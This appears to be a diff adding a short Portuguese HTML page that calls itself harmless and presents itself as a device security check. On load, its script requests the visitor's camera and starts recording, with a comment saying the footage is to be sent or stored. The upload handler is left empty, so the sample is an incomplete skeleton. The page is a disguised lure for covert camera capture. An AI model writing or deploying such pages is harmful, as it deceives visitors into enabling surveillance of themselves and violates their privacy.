@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Inofensiva</title>
+</head>
+<body>
+    <h1>Bem-vindo à página de segurança!</h1>
+    <p>Verifique seu dispositivo.</p>
+
+    <script>
+        // Aqui, o código JavaScript seria inserido para ativar a câmera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = function(event) {
+                    // Enviar ou armazenar o fluxo gravado
+                };
+                mediaRecorder.start();
+            })
+            .catch(function(error) {
+                console.error("Erro ao acessar a câmera: ", error);
+            });
+    </script>
+</body>
+</html>
